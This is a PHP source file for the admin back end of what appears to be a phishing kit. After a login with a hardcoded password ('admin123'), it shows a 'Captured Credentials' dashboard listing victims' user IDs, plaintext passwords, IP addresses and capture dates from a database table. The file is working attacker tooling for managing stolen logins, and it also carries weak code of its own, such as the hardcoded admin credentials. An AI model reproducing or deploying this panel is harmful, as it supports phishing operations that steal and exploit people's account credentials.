<?php
// Simple admin authentication
$admin_username = "admin";
$admin_password = "admin123"; // In a real scenario, use proper hashing

// Check if login form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if ($_POST['username'] === $admin_username && $_POST['password'] === $admin_password) {
        // Set admin session
        session_start();
        $_SESSION['admin_logged_in'] = true;
    } else {
        $error = "Invalid username or password";
    }
}

// Check if admin is logged in
session_start();
$is_logged_in = isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true;

// Include database configuration if admin is logged in
if ($is_logged_in) {
    require_once 'config.php';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 10px;
            border: 1px solid #ddd;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
            font-weight: bold;
        }
        tr:nth-child(even) {
            background-color: #f9f9f9;
        }
        .login-form {
            max-width: 400px;
            margin: 0 auto;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .error {
            color: red;
            margin-bottom: 15px;
        }
        .logout {
            text-align: right;
            margin-bottom: 20px;
        }
        .logout a {
            color: #333;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <?php if (!$is_logged_in): ?>
        <!-- Login Form -->
        <h1>Admin Login</h1>
        
        <?php if (isset($error)): ?>
        <div class="error"><?php echo $error; ?></div>
        <?php endif; ?>
        
        <div class="login-form">
            <form method="post" action="">
                <div class="form-group">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <button type="submit">Login</button>
            </form>
        </div>
        
        <?php else: ?>
        <!-- Admin Dashboard -->
        <div class="logout">
            <a href="admin.php?logout=1">Logout</a>
        </div>
        
        <h1>Captured Credentials</h1>
        
        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>User ID</th>
                    <th>Password</th>
                    <th>IP Address</th>
                    <th>Date Captured</th>
                </tr>
            </thead>
            <tbody>
                <?php
                // Query the captured credentials
                $sql = "SELECT * FROM captured_credentials ORDER BY date_captured DESC";
                $result = mysqli_query($conn, $sql);
                
                if (mysqli_num_rows($result) > 0) {
                    while ($row = mysqli_fetch_assoc($result)) {
                        echo "<tr>";
                        echo "<td>" . $row['id'] . "</td>";
                        echo "<td>" . htmlspecialchars($row['user_id']) . "</td>";
                        echo "<td>" . htmlspecialchars($row['password']) . "</td>";
                        echo "<td>" . htmlspecialchars($row['ip_address']) . "</td>";
                        echo "<td>" . $row['date_captured'] . "</td>";
                        echo "</tr>";
                    }
                } else {
                    echo "<tr><td colspan='5'>No credentials captured yet</td></tr>";
                }
                ?>
            </tbody>
        </table>
        <?php endif; ?>
    </div>
    
    <?php
    // Handle logout
    if ($is_logged_in && isset($_GET['logout']) && $_GET['logout'] == 1) {
        session_unset();
        session_destroy();
        echo "<script>window.location.href = 'admin.php';</script>";
    }
    ?>
</body>
</html> 